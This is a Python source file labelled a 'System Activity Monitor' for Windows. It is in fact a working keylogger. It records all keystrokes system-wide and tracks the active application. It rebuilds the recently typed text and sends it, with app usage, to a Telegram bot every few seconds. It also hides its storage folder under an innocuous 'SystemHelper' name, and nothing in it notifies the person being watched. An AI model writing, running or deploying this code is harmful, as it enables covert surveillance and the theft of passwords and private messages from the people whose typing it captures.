"""
System Activity Monitor - Improved Version
A restructured and optimized monitoring application with better error handling,
type hints, and modular design.
"""

import atexit
import datetime
import json
import logging
import os
import queue
import string
import subprocess
import sys
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from functools import lru_cache
from pathlib import Path
from typing import Dict, Optional, Any, Set, DefaultDict

import psutil
import requests
import win32api
import win32crypt
import win32event
import win32gui
import win32process
import winerror
from cryptography.fernet import Fernet
from decouple import config, Csv
from pynput import keyboard


# ============= Configuration =============
@dataclass
class Config:
    """Application configuration with validation"""
    telegram_token: str
    telegram_chat_id: int
    report_interval: int = 5
    max_buffer_size: int = 1000
    max_retries: int = 3
    ignore_procs: Set[str] = field(default_factory=set)
    keystroke_chunk_size: int = 30
    window_check_interval: float = 0.5
    heartbeat_interval: int = 60
    retention_days: int = 7
    typing_timeout: float = 3.0

    @classmethod
    def from_env(cls) -> 'Config':
        """Load configuration from environment variables"""
        try:
            return cls(
                telegram_token=config('TELEGRAM_TOKEN'),
                telegram_chat_id=config('TELEGRAM_CHAT_ID', cast=int),
                report_interval=5,
                max_buffer_size=config('MAX_BUFFER_SIZE', default=1000, cast=int),
                max_retries=config('MAX_RETRIES', default=3, cast=int),
                ignore_procs=set(config('IGNORE_PROCS', default='', cast=Csv())),
                keystroke_chunk_size=30,
                window_check_interval=0.5,
                heartbeat_interval=60,
                retention_days=7
            )
        except Exception as e:
            print(f"Error loading configuration: {e}")
            sys.exit(1)


# ============= Logging Setup =============
class LoggerSetup:
    """Centralized logging configuration"""

    @staticmethod
    def setup(base_dir: Path, log_level: int = logging.INFO) -> logging.Logger:
        logger = logging.getLogger('ActivityMonitor')
        logger.setLevel(log_level)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_formatter = logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        console_handler.setFormatter(console_formatter)
        logger.addHandler(console_handler)

        # File handler with rotation
        log_file = base_dir / 'monitor.log'
        file_handler = logging.FileHandler(log_file, 'a', 'utf-8')
        file_formatter = logging.Formatter(
            '%(asctime)s [%(levelname)s] [%(funcName)s] %(message)s'
        )
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)

        return logger


# ============= Storage Management =============
class StorageManager:
    """Handles all file system operations"""

    def __init__(self, base_dir: Path):
        self.base_dir = Path(base_dir)
        self.log_file = self.base_dir / 'activity.log.enc'
        self.queue_file = self.base_dir / 'msg_queue.dat'
        self.key_file = self.base_dir / 'fernet.key.dat'
        self.pid_cache_file = self.base_dir / 'pid_cache.json'

        self._setup_directories()

    def _setup_directories(self):
        """Create and hide application directories"""
        try:
            self.base_dir.mkdir(parents=True, exist_ok=True)
            # Hide directory on Windows
            subprocess.call(
                ['attrib', '+h', str(self.base_dir)],
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass

    def clean_old_files(self, retention_days: int):
        """Remove files older than retention period"""
        try:
            cutoff_time = time.time() - (retention_days * 86400)
            for file_path in self.base_dir.iterdir():
                if file_path.is_file() and file_path.stat().st_mtime < cutoff_time:
                    file_path.unlink()
        except Exception:
            pass


# ============= Security =============
class SecureKeyStore:
    """Enhanced secure key storage using Windows DPAPI"""

    # DPAPI flags - these are not exposed as attributes in win32crypt
    CRYPTPROTECT_UI_FORBIDDEN = 0x1
    CRYPTPROTECT_LOCAL_MACHINE = 0x4

    def __init__(self, key_file: Path):
        self.key_file = key_file
        self._fernet: Optional[Fernet] = None
        self._initialize()

    def _protect(self, data: bytes) -> bytes:
        """Protect data using Windows DPAPI"""
        try:
            return win32crypt.CryptProtectData(
                data,
                None,  # Description
                None,  # Optional entropy
                None,  # Reserved
                None,  # Prompt struct
                self.CRYPTPROTECT_LOCAL_MACHINE | self.CRYPTPROTECT_UI_FORBIDDEN
            )
        except Exception as e:
            raise RuntimeError(f"Failed to protect data: {e}")

    def _unprotect(self, blob: bytes) -> bytes:
        """Unprotect data using Windows DPAPI"""
        try:
            # CryptUnprotectData returns a tuple: (description, data)
            result = win32crypt.CryptUnprotectData(
                blob,
                None,  # Optional entropy
                None,  # Reserved
                None,  # Prompt struct
                self.CRYPTPROTECT_UI_FORBIDDEN
            )
            return result[1]  # Return the data portion
        except Exception as e:
            raise RuntimeError(f"Failed to unprotect data: {e}")

    def _initialize(self):
        """Load or generate encryption key"""
        if self.key_file.exists():
            try:
                blob = self.key_file.read_bytes()
                raw_key = self._unprotect(blob)
            except Exception as e:
                # If we can't decrypt existing key, generate new one
                print(f"Warning: Could not decrypt existing key ({e}), generating new one")
                raw_key = Fernet.generate_key()
                blob = self._protect(raw_key)
                self.key_file.write_bytes(blob)
        else:
            # Generate new key
            raw_key = Fernet.generate_key()
            try:
                blob = self._protect(raw_key)
                # Ensure parent directory exists
                self.key_file.parent.mkdir(parents=True, exist_ok=True)
                self.key_file.write_bytes(blob)
            except Exception as e:
                raise RuntimeError(f"Failed to save encryption key: {e}")

        self._fernet = Fernet(raw_key)

    @property
    def fernet(self) -> Fernet:
        if self._fernet is None:
            raise RuntimeError("Encryption not initialized")
        return self._fernet


# ============= Process Cache =============
class ProcessCache:
    """Cached process name resolution with persistence"""

    def __init__(self, cache_file: Path):
        self.cache_file = cache_file
        self.cache: Dict[int, str] = {}
        self._lock = threading.RLock()
        self._load_cache()

    def _load_cache(self):
        """Load cache from disk"""
        if self.cache_file.exists():
            try:
                with open(self.cache_file, 'r') as f:
                    data = json.load(f)
                    # Convert string keys back to integers
                    self.cache = {int(k): v for k, v in data.items()}
            except (json.JSONDecodeError, ValueError, TypeError):
                self.cache = {}
        else:
            self.cache = {}

    def save_cache(self):
        """Persist cache to disk"""
        with self._lock:
            try:
                # Ensure parent directory exists
                self.cache_file.parent.mkdir(parents=True, exist_ok=True)

                with open(self.cache_file, 'w') as f:
                    json.dump(self.cache, f, indent=2)
            except Exception:
                pass

    @lru_cache(maxsize=256)
    def get_process_name(self, pid: int) -> str:
        """Get process name with caching"""
        with self._lock:
            if pid in self.cache:
                return self.cache[pid]

            try:
                proc = psutil.Process(pid)
                name = proc.name().lower()
                self.cache[pid] = name
                return name
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                return "unknown"


# ============= Telegram Integration =============
class TelegramClient:
    """Improved Telegram client with connection pooling and retry logic"""

    def __init__(self, token: str, chat_id: int, max_retries: int = 3):
        self.token = token
        self.chat_id = chat_id
        self.max_retries = max_retries
        self.session = self._create_session()
        self._available = True
        self._last_check = 0
        self._check_interval = 30

    def _create_session(self) -> requests.Session:
        """Create configured requests session"""
        session = requests.Session()
        session.timeout = 10
        session.headers.update({
            'User-Agent': 'SystemMonitor/1.0'
        })
        return session

    def check_availability(self) -> bool:
        """Check if Telegram API is accessible"""
        if time.time() - self._last_check < self._check_interval:
            return self._available

        try:
            response = self.session.get(
                f'https://api.telegram.org/bot{self.token}/getMe',
                timeout=5
            )
            self._available = response.status_code == 200
        except Exception:
            self._available = False

        self._last_check = time.time()
        return self._available

    def send_message(self, text: str, parse_mode: str = 'Markdown') -> bool:
        """Send message with automatic chunking for long texts"""
        if not self.check_availability():
            return False

        try:
            # Split long messages
            max_length = 4000
            for i in range(0, len(text), max_length):
                chunk = text[i:i + max_length]
                response = self.session.post(
                    f'https://api.telegram.org/bot{self.token}/sendMessage',
                    json={
                        'chat_id': self.chat_id,
                        'text': chunk,
                        'parse_mode': parse_mode
                    }
                )
                if response.status_code != 200:
                    return False
            return True
        except Exception:
            return False


# ============= Activity Tracking =============
@dataclass
class ActivityData:
    """Structure for activity tracking data"""
    time: float = field(default=0.0)
    keystrokes: int = field(default=0)
    key_types: DefaultDict[str, int] = field(default_factory=lambda: defaultdict(int))


class ActivityTracker:
    """Tracks application activity and typing patterns"""

    def __init__(self, config: Config):
        self.config = config
        self.activity_map: DefaultDict[str, ActivityData] = defaultdict(ActivityData)
        self.current_proc: Optional[str] = None
        self.last_hwnd: Optional[int] = None
        self.hwnd_change_time: float = time.time()
        self.typed_content = {
            'text': '',
            'start_time': time.time(),
            'last_time': time.time()
        }
        self._lock = threading.RLock()

    def update_activity_time(self):
        """Update time spent in current application"""
        now = time.time()
        if self.current_proc and self.current_proc not in self.config.ignore_procs:
            elapsed = now - self.hwnd_change_time
            with self._lock:
                # Safely access or create the activity data
                activity_data = self.activity_map[self.current_proc]
                activity_data.time += elapsed
        self.hwnd_change_time = now

    def record_keystroke(self, proc: str, key_type: str):
        """Record a keystroke for the given process"""
        if proc not in self.config.ignore_procs:
            with self._lock:
                activity_data = self.activity_map[proc]
                activity_data.keystrokes += 1
                activity_data.key_types[key_type] += 1

    def update_typed_content(self, key_repr: str):
        """Update the typed content buffer"""
        now = time.time()
        if now - self.typed_content.get('last_time', 0) > self.config.typing_timeout:
            self.typed_content = {
                'text': '',
                'start_time': now,
                'last_time': now
            }
        else:
            self.typed_content['last_time'] = now

        if key_repr == '[backspace]' and self.typed_content.get('text'):
            self.typed_content['text'] = self.typed_content['text'][:-1]
        elif key_repr not in ['[shift]', '[ctrl]', '[alt]']:
            self.typed_content['text'] += key_repr

    def get_report_data(self) -> Dict[str, Any]:
        """Generate report data and reset counters"""
        with self._lock:
            # Calculate totals before clearing
            total_keystrokes = sum(d.keystrokes for d in self.activity_map.values())
            active_apps = [
                (proc, data.keystrokes)
                for proc, data in self.activity_map.items()
                if data.keystrokes > 0
            ]

            # Sort active apps by keystroke count
            active_apps.sort(key=lambda x: x[1], reverse=True)

            # Get typed sample
            typed_sample = self.typed_content.get('text', '')[-150:].strip()

            # Store current process before clearing
            current_proc_name = self.current_proc or "Unknown"

            # Reset activity map for next report
            self.activity_map.clear()

            # Reset hwnd_change_time to now so we don't accumulate time during report generation
            self.hwnd_change_time = time.time()

            return {
                'total_keystrokes': total_keystrokes,
                'active_apps': active_apps,
                'current_proc': current_proc_name,
                'typed_sample': typed_sample
            }

# ============= Main Monitor Application =============
class SystemMonitor:
    """Main monitoring application with improved architecture"""

    def __init__(self, config: Config):
        self.config = config
        self.logger = logger

        # Initialize components
        self.storage = StorageManager(
            Path(os.environ.get('APPDATA', '')) / 'SystemHelper'
        )
        self.secure_store = SecureKeyStore(self.storage.key_file)
        self.pid_cache = ProcessCache(self.storage.pid_cache_file)
        self.telegram = TelegramClient(
            config.telegram_token,
            config.telegram_chat_id,
            config.max_retries
        )
        self.tracker = ActivityTracker(config)

        # Threading components
        self.exit_event = threading.Event()
        self.msg_queue: queue.Queue = queue.Queue()
        self.last_report_time = time.time()

        # Keyboard listener
        self.listener: Optional[keyboard.Listener] = None

        # Register cleanup
        atexit.register(self._cleanup)

        # Clean old files on startup
        self.storage.clean_old_files(config.retention_days)

        self.logger.info("System monitor initialized")

    def _get_window_process(self, hwnd: int) -> Optional[str]:
        """Get process name from window handle"""
        try:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            if pid == 0:
                return None

            # Try to get from window title first
            window_title = win32gui.GetWindowText(hwnd)
            if window_title:
                parts = window_title.split(' - ')
                if len(parts) > 1:
                    return parts[-1].strip().lower()

            # Fall back to process name
            return self.pid_cache.get_process_name(pid)
        except Exception:
            return None

    def _check_window_change(self) -> bool:
        """Check if the active window has changed"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd != self.tracker.last_hwnd:
                self.tracker.last_hwnd = hwnd
                proc = self._get_window_process(hwnd)

                self.tracker.update_activity_time()

                if proc != self.tracker.current_proc:
                    self.tracker.current_proc = proc
                    self.tracker.typed_content = {
                        'text': '',
                        'start_time': time.time(),
                        'last_time': time.time()
                    }
                return True
        except Exception:
            pass
        return False

    def _categorize_key(self, key) -> str:
        """Categorize a keyboard key"""
        if hasattr(key, 'char') and key.char:
            char = key.char
            if char.isalpha():
                return 'Letters'
            elif char.isdigit():
                return 'Numbers'
            elif char in string.punctuation:
                return 'Punctuation'
            elif char.isspace():
                return 'Whitespace'
            return 'Special'

        if hasattr(key, 'name'):
            name = key.name.lower()
            if name in ['enter', 'tab', 'backspace', 'delete']:
                return 'Navigation'
            elif name in ['shift', 'ctrl', 'alt', 'cmd']:
                return 'Modifiers'
            elif name.startswith('f') and len(name) > 1 and name[1:].isdigit():
                return 'Function'
            return 'Special'

        return 'Unknown'

    def _get_key_representation(self, key) -> str:
        """Get string representation of a key"""
        if hasattr(key, 'char') and key.char:
            return key.char
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        elif hasattr(key, 'name'):
            return f"[{key.name}]"
        else:
            return f"[{key}]"

    def _on_key_press(self, key):
        """Handle keyboard press event"""
        try:
            self._check_window_change()

            if not self.tracker.current_proc or \
                    self.tracker.current_proc in self.config.ignore_procs:
                return

            key_repr = self._get_key_representation(key)
            key_type = self._categorize_key(key)

            # Update tracking
            self.tracker.update_typed_content(key_repr)
            self.tracker.record_keystroke(self.tracker.current_proc, key_type)

        except Exception as e:
            self.logger.error(f"Key press handling error: {e}")

    def _window_monitor_thread(self):
        """Thread for monitoring window changes"""
        while not self.exit_event.is_set():
            try:
                self._check_window_change()
                time.sleep(self.config.window_check_interval)
            except Exception as e:
                self.logger.error(f"Window monitor error: {e}")
                time.sleep(1)

    def _report_timer_thread(self):
        """Thread for sending periodic reports"""
        while not self.exit_event.is_set():
            try:
                self._send_report()
                time.sleep(self.config.report_interval)
            except Exception as e:
                self.logger.error(f"Report timer error: {e}")
                time.sleep(1)

    def _send_worker_thread(self):
        """Thread for processing message queue"""
        while not self.exit_event.is_set():
            try:
                item = self.msg_queue.get(timeout=2)

                success = False
                if item['type'] == 'text':
                    success = self.telegram.send_message(item['text'])

                if not success:
                    item['retries'] = item.get('retries', 0) + 1
                    if item['retries'] <= self.config.max_retries:
                        # Exponential backoff
                        time.sleep(min(2 ** item['retries'], 30))
                        self.msg_queue.put(item)
                    else:
                        self.logger.error(f"Message dropped after {item['retries']} retries")

                self.msg_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Send worker error: {e}")

    def _send_report(self):
        """Generate and send activity report"""
        try:
            report_end_time = time.time()
            tracking_seconds = report_end_time - self.last_report_time

            # Update activity time BEFORE getting report data
            self.tracker.update_activity_time()

            # Get report data (this will reset counters)
            data = self.tracker.get_report_data()

            # Format report
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            report_lines = [
                f"🔄 *{timestamp}* ({tracking_seconds:.1f}s)",
                f"⌨️ **{data['total_keystrokes']} keystrokes**"
            ]

            if data['active_apps']:
                report_lines.append("\n📱 *Active apps:*")
                for proc, keys in data['active_apps'][:5]:
                    # Escape underscores and other markdown special chars
                    proc_escaped = proc.replace('_', '\\_')
                    report_lines.append(f"▪ `{proc_escaped}`: {keys} keys")

            # Escape current process name
            current_escaped = data['current_proc'].replace('_', '\\_')
            report_lines.append(f"\n🖥️ *Current:* `{current_escaped}`")

            if data['typed_sample']:
                # Escape markdown in typed content
                typed_escaped = data['typed_sample'].replace('`', '\\`').replace('*', '\\*')
                report_lines.append(f"\n✍️ *Recent typing:*\n```\n{typed_escaped}\n```")

            report_text = "\n".join(report_lines)

            # Queue message
            self.msg_queue.put({
                'type': 'text',
                'text': report_text,
                'timestamp': time.time(),
                'retries': 0
            })

            # Update last report time AFTER successfully creating report
            self.last_report_time = report_end_time
            self.logger.info(f"Report queued: {data['total_keystrokes']} keys")

        except Exception as e:
            self.logger.error(f"Report generation error: {e}", exc_info=True)

    def start(self):
        """Start all monitoring threads"""
        try:
            # Start keyboard listener
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()

            # Start worker threads
            threads = [
                threading.Thread(target=self._window_monitor_thread, daemon=True),
                threading.Thread(target=self._report_timer_thread, daemon=True),
                threading.Thread(target=self._send_worker_thread, daemon=True)
            ]

            for thread in threads:
                thread.start()

            self.logger.info(f"Monitor started - reporting every {self.config.report_interval}s")

        except Exception as e:
            self.logger.error(f"Failed to start monitor: {e}")
            raise

    def run(self):
        """Main run loop"""
        self.start()
        try:
            while not self.exit_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt received")
        finally:
            self._cleanup()

    def _cleanup(self):
        """Cleanup resources on exit"""
        try:
            self.logger.info("Performing cleanup...")
            self.exit_event.set()

            if self.listener and self.listener.is_alive():
                self.listener.stop()

            self.tracker.update_activity_time()
            self.pid_cache.save_cache()

            # Wait for queue to empty
            self.msg_queue.join()

            self.logger.info("Cleanup completed")

        except Exception as e:
            self.logger.error(f"Cleanup error: {e}")


# ============= Entry Point =============
def check_single_instance() -> Optional[Any]:
    """Ensure only one instance is running"""
    mutex = win32event.CreateMutex(None, False, "Global\\SystemHelperMonitor")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("Application is already running")
        sys.exit(0)
    return mutex


def main():
    """Main entry point"""
    print("Starting System Monitor...")

    # Check for single instance
    mutex = check_single_instance()

    # Load configuration
    app_config = Config.from_env()

    # Setup directories
    base_dir = Path(os.environ.get('APPDATA', '')) / 'SystemHelper'
    base_dir.mkdir(parents=True, exist_ok=True)

    # Setup logging
    global logger
    logger = LoggerSetup.setup(base_dir)

    try:
        # Create and run monitor
        monitor = SystemMonitor(app_config)
        monitor.run()
    except Exception as e:
        logger.error(f"Critical error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
